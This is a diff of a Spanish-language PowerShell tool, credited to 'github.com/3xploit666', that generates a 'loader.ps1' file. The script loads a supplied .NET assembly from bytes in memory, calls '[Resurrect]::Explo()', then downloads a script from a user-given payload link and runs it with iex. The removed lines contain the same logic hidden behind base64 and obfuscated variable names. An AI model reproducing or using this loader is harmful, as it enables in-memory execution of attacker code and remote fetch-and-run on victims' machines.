@@ -1,16 +1,49 @@
-﻿${_/=\/=====\/\/==\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAiCWIJYgl3gaIJYgliCWIJYgliCWIJSAAXQCEJYQlhCWEJYQlhCWEJYQlhCWEJYQlhCWDJQ0ACgCCJYQlhSWIJYgliCWIJYgliCWIJYgliCWFJYQlgyWCJQ0ACgBJAIgliCWIJYgliCWIJYgliCWIJYgliCWIJYgliCWIJYgliCWIJYglXQAuAA0ACgDlJZkisiWZIrIlmSKyJZkisiWZIrIlmSKyJZki5CUuAC4ALgANAAoADQAKACAALgAuAC4ALgAvACIAIgAiACIAIgAiACIAIgB8AD0APQA9AD0APQA9AFsAXQANAAoALgAuAC4ALgAvACIAIgAiACIAIgAiACIAIgAiACIAIgAiAHwAIAANAAoALwAiACIAIgAiACIAIgAiACIAIgAiACIAIgAiACIAIgAiACIAIgAiACIAIgAiACIAIgAiAFwADQAKAFwAKABAACkAIAAoAEAAKQAgACgAQAApACAAKABAACkAIAAoAEAAKQAgACgAQAApAC8ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABnAGkAdABoAHUAYgAuAGMAbwBtAC8AMwB4AHAAbABvAGkAdAA2ADYANgANAAoAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AeQBvAHUAdAB1AGIAZQAuAGMAbwBtAC8AYwBoAGEAbgBuAGUAbAAvAFUAQwBWAGgAZgBSAEEAUwBkAFYAdABUAEkANgBrADQAaQBlADYARgBpADkAWgBRAC8AdgBpAGQAZQBvAHMADQAKAA0ACgANAAoAIAAgAA==')));
-Write-Host ${_/=\/=====\/\/==\} -ForegroundColor DarkMagenta
-function __/\/==\/===\/===\ {
+$startlogin = @" 
+
+
+              ███۞███████ ]▄▄▄▄▄▄▄▄▄▄▄▄▃
+▂▄▅█████████▅▄▃▂
+I███████████████████].
+◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...
+
+ ..../""""""""|======[]
+..../""""""""""""| 
+/"""""""""""""""""""""""""\
+\(@) (@) (@) (@) (@) (@)/
+
+                                                                                    github.com/3xploit666
+https://www.youtube.com/channel/UCVhfRASdVtTI6k4ie6Fi9ZQ/videos
+
+
+  
+"@;
+Write-Host $startlogin -ForegroundColor DarkMagenta
+
+function ConvertBytes {
+
 param (
-      [string]${___/\_/=\/==\/\_/\}  = $( Read-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqACoAKgBQAEEAVABIACAARgBJAEwARQAqACoAKgBdAA=='))) ),
-      [string]${__/\__/=====\_/===}  = $( Read-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AcwBlAHIAdABhACAAbABpAG4AawAgAHAAYQB5AGwAbwBhAGQAXQA='))) )
+      [string]$in  = $( Read-Host "[***PATH FILE***]" ),
+      [string]$in2  = $( Read-Host "[Inserta link payload]" )
+
+     
 )
-sleep -s 2 
-if (-Not (Test-Path ${___/\_/=\/==\/\_/\})) { Read-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBFAFIASQBGAEkAQwBBACAAVABVACAAUgBVAFQAQQAuAC4ALgAuAC4ALgAuAA=='))) }
-${___/==\/=\__/\___}  =  [System.IO.File]::ReadAllBytes(${___/\_/=\/==\/\_/\})  -join "," 
-${/==\/=\___/==\__/} = "C:" + $env:HOMEPATH + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABsAG8AYQBkAGUAcgAuAHAAcwAxAA==')))
-${__/=\/\/\/==\_/==} =  $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoAFsAYgB5AHQAZQBbAF0AXQAoACQAewBfAF8AXwAvAD0APQBcAC8APQBcAF8AXwAvAFwAXwBfAF8AfQApACkAOwBbAFIAZQBzAHUAcgByAGUAYwB0AF0AOgA6AEUAeABwAGwAbwAoACkAOwBTAHQAYQByAHQALQBzAGwAZQBlAHAAIAAtAHMAIAAzADsAIAAkAGQAbwB3ACAAPQAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnACQAewBfAF8ALwBcAF8AXwAvAD0APQA9AD0APQBcAF8ALwA9AD0APQB9ACcAKQA7AGkAZQB4ACAAJABkAG8AdwA=')))
-Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHYAbwAgAEcAZQBuAGUAcgBhAGQAbwAuAC4AIABlAG4AIAA+ACAA')))  ${/==\/=\___/==\__/}
-${__/=\/\/\/==\_/==} | Out-File ${/==\/=\___/==\__/}
+
+Start-Sleep -s 2 
+
+if (-Not (Test-Path $in)) { Read-Host "VERIFICA TU RUTA......." }
+
+$bytes  =  [System.IO.File]::ReadAllBytes($in)  -join "," 
+
+$path = "C:" + $env:HOMEPATH + "\loader.ps1"
+
+$loader =  "[System.Reflection.Assembly]::Load([byte[]]($bytes));[Resurrect]::Explo();Start-sleep -s 3; `$dow =(new-object net.webclient).DownloadString('$in2');iex `$dow"
+
+Write-Host "Archivo Generado.. en > "  $path
+
+$loader | Out-File $path
+
 }
-__/\/==\/===\/===\
+
+ConvertBytes
+
+
